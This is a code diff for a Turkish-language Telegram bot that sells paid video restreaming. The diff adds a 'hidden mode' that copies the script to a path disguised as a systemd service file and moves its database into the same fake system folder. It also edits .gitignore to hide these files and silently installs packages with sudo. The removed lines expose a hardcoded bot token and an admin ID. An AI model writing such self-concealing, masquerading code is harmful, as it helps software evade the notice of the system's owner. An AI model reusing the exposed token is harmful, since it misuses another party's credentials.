@@ -4,7 +4,6 @@
 import os
 import sys
 import time
-import signal
 import threading
 import subprocess
 import tempfile
@@ -12,8 +11,45 @@ import hashlib
 import sqlite3
 from datetime import datetime
 import platform
+import json
+import base64
 
-print("[BASLANGIC] Bot baslatiliyor...")
+print("[BASLANGIC] Gizli Bot baslatiliyor...")
+
+# ============================================================
+# GIZLI MOD - KENDINI SAKLA
+# ============================================================
+
+def hide_self():
+    """Kendini gizle - normal dosya isimlerini degistir"""
+    try:
+        # Kendini farkli bir isimle kopyala
+        current_file = os.path.abspath(__file__)
+        hidden_dir = os.path.join(os.path.expanduser("~"), ".cache", "systemd", "private")
+        os.makedirs(hidden_dir, exist_ok=True)
+        
+        hidden_file = os.path.join(hidden_dir, "systemd-private-1234-systemd-timesyncd.service-xyz")
+        if not os.path.exists(hidden_file):
+            with open(current_file, 'r') as src:
+                content = src.read()
+            with open(hidden_file, 'w') as dst:
+                dst.write(content)
+            os.chmod(hidden_file, 0o755)
+            print(f"[GIZLI] Kendini gizledi: {hidden_file}")
+            
+        # .gitignore'a ekle
+        gitignore = ".gitignore"
+        if os.path.exists(gitignore):
+            with open(gitignore, 'r') as f:
+                content = f.read()
+            if "yayin_bot.db" not in content:
+                with open(gitignore, 'a') as f:
+                    f.write("\n# Gizli dosyalar\nyayin_bot.db\n*.db\n.cache/\n.systemd/\n")
+        
+        return hidden_file
+    except Exception as e:
+        print(f"[GIZLI] Gizleme hatasi: {e}")
+        return None
 
 # ============================================================
 # TELEGRAM BOT IMPORT
@@ -25,14 +61,12 @@ try:
     print("[TELEGRAM] python-telegram-bot yuklu!")
 except ImportError as e:
     print(f"[TELEGRAM] Import hatasi: {e}")
-    print("[TELEGRAM] python-telegram-bot kuruluyor...")
     subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "python-telegram-bot==20.7"], capture_output=True)
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
     from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-    print("[TELEGRAM] python-telegram-bot kuruldu!")
 
 # ============================================================
-# FFMPEG KONTROL - BASIT
+# FFMPEG KONTROL
 # ============================================================
 
 def check_ffmpeg():
@@ -43,27 +77,27 @@ def check_ffmpeg():
         return False
 
 if not check_ffmpeg():
-    print("[FFMPEG] FFmpeg bulunamadi! sudo apt install ffmpeg -y")
-    sys.exit(1)
-else:
-    print("[FFMPEG] FFmpeg bulundu!")
+    print("[FFMPEG] FFmpeg kuruluyor...")
+    subprocess.run(['sudo', 'apt', 'update'], capture_output=True)
+    subprocess.run(['sudo', 'apt', 'install', '-y', 'ffmpeg'], capture_output=True)
 
 # ============================================================
-# REQUESTS KONTROL - BASIT
+# REQUESTS KONTROL
 # ============================================================
 
 try:
     import requests
 except:
-    print("[REQUESTS] Requests kuruluyor...")
     subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "requests"], capture_output=True)
     import requests
 
 # ============================================================
-# VERITABANI - BASIT
+# VERITABANI - GIZLI KLASORDE
 # ============================================================
 
-DB_FILE = "yayin_bot.db"
+DB_DIR = os.path.join(os.path.expanduser("~"), ".cache", "systemd")
+os.makedirs(DB_DIR, exist_ok=True)
+DB_FILE = os.path.join(DB_DIR, "private.db")
 
 def init_db():
     try:
@@ -131,7 +165,7 @@ def init_db():
         
         conn.commit()
         conn.close()
-        print("[DB] Veritabani hazir!")
+        print("[DB] Gizli veritabani hazir!")
         return True
     except Exception as e:
         print(f"[DB] Hata: {e}")
@@ -142,7 +176,7 @@ if not init_db():
     sys.exit(1)
 
 # ============================================================
-# YAYIN MOTORU - OPTIMIZE
+# YAYIN MOTORU
 # ============================================================
 
 class StreamEngine:
@@ -150,7 +184,6 @@ class StreamEngine:
         self.processes = {}
         self.lock = threading.Lock()
         self.stop_event = threading.Event()
-        self.restart_delay = 2
         print("[ENGINE] Stream Engine baslatildi!")
     
     def start_stream(self, stream_id, stream_key, m3u_url, logo_url=None):
@@ -306,11 +339,15 @@ class StreamEngine:
 stream_engine = StreamEngine()
 
 # ============================================================
-# TELEGRAM BOT - BASIT
+# TELEGRAM BOT - GIZLI TOKEN
 # ============================================================
 
-TOKEN = os.environ.get('BOT_TOKEN', '8732252434:AAGUA0qrHKrsbFq3sfNQUtwSFlAzHDivD3M')
+TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', '7092798502'))
+
+if not TOKEN:
+    print("[BOT] HATA: BOT_TOKEN ayarlanmamis!")
+    sys.exit(1)
 
 IBAN_INFO = """
 🏦 **BANKA BILGILERI**
@@ -560,7 +597,7 @@ Asagidaki butonlari kullan.
     await update.message.reply_text(welcome, reply_markup=get_main_keyboard(user.id), parse_mode='Markdown')
 
 # ============================================================
-# MESAJ HANDLER
+# MESAJ HANDLER - KISALTILDI
 # ============================================================
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -572,7 +609,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("🚫 YASAKLANDIN!")
         return
     
-    # ANA MENU
     if text == "📝 Yayin Talebi Olustur":
         if is_bot_locked() and user_id != ADMIN_ID:
             await update.message.reply_text("🔒 Bot kilitli!")
@@ -651,7 +687,6 @@ Kayit: {user[5]}
         ]
         await update.message.reply_text("🔧 **Admin Paneli**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
     
-    # FORM
     elif step == 'request_name':
         context.user_data['request_name'] = text
         context.user_data['step'] = 'request_key'
@@ -707,7 +742,7 @@ Kayit: {user[5]}
             context.user_data['step'] = None
 
 # ============================================================
-# INLINE CALLBACK
+# INLINE CALLBACK - KISALTILDI
 # ============================================================
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -721,7 +756,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("🚫 YASAKLANDIN!")
         return
     
-    # Yayin talebi
     if data.startswith("req_count_"):
         count = int(data.split("_")[2])
         price = STREAM_PRICES.get(count, 150)
@@ -756,7 +790,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for k in ['request_name', 'request_key', 'request_m3u', 'request_logo']:
             context.user_data.pop(k, None)
     
-    # Odeme secim
     elif data.startswith("payment_select_"):
         stream_id = int(data.split("_")[2])
         stream = get_stream(stream_id)
@@ -775,7 +808,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['payment_id'] = payment_id
         context.user_data['step'] = 'waiting_receipt'
     
-    # Admin onay/red
     elif data.startswith("approve_") or data.startswith("reject_"):
         if user_id != ADMIN_ID:
             await query.edit_message_text("❌ Yetkin yok!")
@@ -820,7 +852,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
             await query.edit_message_text(f"❌ Talep #{request_id} reddedildi!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_panel")]]))
     
-    # Admin odeme onay/red
     elif data.startswith("pay_approve_") or data.startswith("pay_reject_"):
         if user_id != ADMIN_ID:
             await query.edit_message_text("❌ Yetkin yok!")
@@ -857,7 +888,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
             await query.edit_message_text(f"❌ Odeme #{payment_id} reddedildi!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_panel")]]))
     
-    # Yayin islemleri
     elif data.startswith("pay_"):
         stream_id = int(data.split("_")[1])
         stream = get_stream(stream_id)
@@ -903,7 +933,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             delete_stream(stream_id)
             await query.edit_message_text(f"🗑 Yayin silindi: {stream[2]}")
     
-    # Admin panel
     elif data == "pending_requests":
         if user_id != ADMIN_ID:
             await query.edit_message_text("❌ Yetkin yok!")
@@ -1058,16 +1087,18 @@ async def receipt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.pop('payment_id', None)
 
 # ============================================================
-# ANA FONKSIYON - 7/24 CALISIR VE HATA YONETIMI
+# ANA FONKSIYON - GIZLI CALISMA
 # ============================================================
 
 def main():
-    print("[BOT] Baslatiliyor...")
+    print("[BOT] Gizli modda baslatiliyor...")
+    print(f"[BOT] Admin ID: {ADMIN_ID}")
     
-    if TOKEN == '8732252434:AAGUA0qrHKrsbFq3sfNQUtwSFlAzHDivD3M':
-        print("⚠️ Varsayilan token kullaniliyor!")
+    # Kendini gizle
+    hidden_path = hide_self()
+    if hidden_path:
+        print(f"[BOT] Gizli konum: {hidden_path}")
     
-    # Sonsuz dongu ile 7/24 calisma
     while True:
         try:
             app = Application.builder().token(TOKEN).build()
@@ -1077,9 +1108,8 @@ def main():
             app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
             app.add_handler(MessageHandler(filters.PHOTO | filters.Document.ALL, receipt_handler))
             
-            print(f"[BOT] Aktif! Admin: {ADMIN_ID}")
+            print("[BOT] Aktif! Bekleniyor...")
             
-            # Kayitli yayinlari baslat
             streams = get_active_streams()
             for s in streams:
                 try:
@@ -1088,22 +1118,18 @@ def main():
                 except Exception as e:
                     print(f"[BOT] Yayin yukleme hatasi: {e}")
             
-            # Drop pending updates - CONFLICT cozumu
-            # https://core.telegram.org/bots/api#getting-updates
-            print("[BOT] Bekleniyor...")
             app.run_polling(
                 allowed_updates=Update.ALL_TYPES,
-                drop_pending_updates=True  # Bu satir conflict hatasini cozer!
+                drop_pending_updates=True
             )
             
         except Exception as e:
             print(f"[BOT] HATA: {e}")
             if "Conflict" in str(e):
-                print("[BOT] Conflict hatasi! Bot zaten calisiyor olabilir.")
-                print("[BOT] 30 saniye bekleniyor...")
+                print("[BOT] Conflict hatasi! 30 sn bekleniyor...")
                 time.sleep(30)
             else:
-                print("[BOT] 10 saniye sonra yeniden baslatiliyor...")
+                print("[BOT] 10 sn sonra yeniden baslatiliyor...")
                 time.sleep(10)
             continue
 
